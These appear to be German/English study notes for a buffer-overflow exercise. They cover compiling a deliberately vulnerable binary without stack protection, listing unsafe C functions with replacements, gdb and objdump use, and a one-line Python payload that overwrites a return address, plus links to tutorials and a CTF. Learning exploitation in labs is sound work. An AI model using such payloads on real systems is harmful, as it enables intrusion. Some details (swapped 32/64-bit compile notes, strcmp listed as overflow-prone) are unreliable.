

## Kompilieren der vuln's
For 32 bit systems
$ gcc vuln_gets.c -o vuln_gets -fno-stack-protector
For 64 bit systems
$ gcc vuln_gets.c -o vuln_gets -fno-stack-protector -m32

## What all C functions are vulnerable to Buffer Overflow Exploit?
- gets use: fgets
- scanf use: sscanf
- sprintf
- strcpy use: strncpy
- strcmp use: strncmp

## disassembly of the binary
objdump -d vuln

## Verwendung des gdb - General Debugger
```shell
gdb: disam main
gdb: r arg1 arg2 ... ; run with Arguments
gdb: b <adress> ; set Breakpoint
```

## Wo liegt die Rücksprungadresse und wo der auszuführende Code?
RET call <function> im gdb view, z. B.  0x8000470

%eip: The Instruction pointer register
%esp: The Stack pointer register
%ebp: The Base pointer register

## Payloads
```python
python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
```

## x86 Instruction Listings
[https://en.wikipedia.org/wiki/X86_instruction_listings](https://en.wikipedia.org/wiki/X86_instruction_listings)


## Sonstiges
- [http://insecure.org/stf/smashstack.html](http://insecure.org/stf/smashstack.html)
- [https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/)
- [https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)
- [https://backdoor.sdslabs.co/](https://backdoor.sdslabs.co/)  BackdoorCTF
- [https://backdoor.sdslabs.co/challenges/ECHO](https://backdoor.sdslabs.co/challenges/ECHO) Challenge
